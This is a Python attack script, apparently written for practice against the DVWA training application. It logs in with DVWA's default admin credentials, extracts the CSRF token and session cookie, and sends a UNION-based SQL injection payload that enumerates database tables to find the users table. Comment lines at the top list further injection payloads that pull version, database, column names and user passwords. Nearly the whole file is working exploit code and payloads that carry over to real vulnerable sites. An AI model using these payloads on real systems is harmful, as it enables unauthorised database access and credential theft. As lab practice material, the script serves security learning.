#!/usr/bin/python3

#' UNION SELECT version(), NULL#
#' UNION SELECT database(), NULL#
#' UNION SELECT NULL, table_name FROM information_schema.tables#
#' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'users'#

#' UNION SELECT user, password FROM users#

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> DVWA SQL Injection - sqli determines table name')
        print('    >> by twseptian\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}âœ“{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

# set proxies
proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def get_csrf_token(s, url):
    path = "/login.php"
    r = s.get(url + path, proxies=proxies, allow_redirects=False)
    #extract anti-csrf token
    soup = BeautifulSoup(r.text, 'html.parser')
    user_token = soup("input", {"name": "user_token"})[0]["value"]
    output.info("Grabbing user token & session id...")
    output.success("user token: %s" %user_token)
    #extract session information
    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)
    output.success("session id: %s" % session_id)
    return user_token, session_id

def login_to_dvwa(s, url):
    global cookies, headers
    user_token, session_id = get_csrf_token(s, url)
    data = {"username":"admin","password":"password","Login":"Login","user_token": user_token}
    cookies = {"PHPSESSID": session_id, "security": "low"}
    headers = { 'content-type': 'application/x-www-form-urlencoded', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
    path = "/login.php"
    r = s.post(url + path, data=data, cookies=cookies, headers=headers, verify=False, allow_redirects=False, proxies=proxies)
    if r.headers["Location"] == 'index.php':
        return True
    else:
        return False

def sqli_users_table(s, url):
    start_path = "/vulnerabilities/sqli/?id=1"
    sqli_payload = "%27+UNION+SELECT+NULL%2C+table_name+FROM+information_schema.tables%23"
    end_path = "&Submit=Submit"
    r = requests.get(url + start_path + sqli_payload + end_path, cookies=cookies, headers=headers, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    users_table = soup.find(text=re.compile('(users)'))
    if users_table:
        return users_table
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        output.info("Usage: %s <url>" %sys.argv[0])
        output.info("Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    if login_to_dvwa(s, url):
        output.success("Success login to Admin page")
        output.info("Looking for a users table...")
        users_table = sqli_users_table(s, url)
        if users_table:
            output.success("Found the users table name: %s" % users_table)
        else:
            output.error("Did not find a users table.")
    else:
        output.error("Did not login to Admin page")